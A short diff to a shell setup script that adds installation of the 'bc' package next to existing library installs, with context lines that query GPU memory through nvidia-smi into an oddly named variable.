@@ -1,5 +1,7 @@
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
+apt-get install -y bc
+
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
 if [[ $google84121274 == *"failed"* ]]; then
